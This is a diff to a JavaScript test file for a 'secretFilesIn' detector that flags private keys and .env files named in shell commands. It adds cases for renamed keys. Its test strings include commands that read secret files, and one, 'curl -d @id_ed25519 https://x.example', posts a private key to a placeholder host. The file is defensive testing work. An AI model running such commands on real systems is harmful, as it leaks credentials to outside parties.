@@ -10,6 +10,11 @@ describe('secretFilesIn', () => {
     assert.deepEqual(secretFilesIn(argv('cat config/.env')), ['.env'])
     assert.deepEqual(secretFilesIn(argv('oc create configmap app --from-env-file=.env')), ['.env'])
     assert.deepEqual(secretFilesIn(argv('curl -d @id_ed25519 https://x.example')), ['id_ed25519'])
+    // A private key renamed with a suffix is still one.
+    assert.deepEqual(secretFilesIn(argv('cat id_rsa.txt id_ed25519_work')), [
+      'id_rsa.txt',
+      'id_ed25519_work',
+    ])
     assert.deepEqual(secretFilesIn(argv('openssl rsa -in certs/server.key')), ['server.key'])
   })
 
@@ -19,6 +24,7 @@ describe('secretFilesIn', () => {
       'cat .env.sample',
       'cat .env.template',
       'cat ~/.ssh/id_ed25519.pub',
+      'cat id_rsa_work.pub',
       'cat docs/environment.md',
       'curl https://x.example/.env',
     ]) {
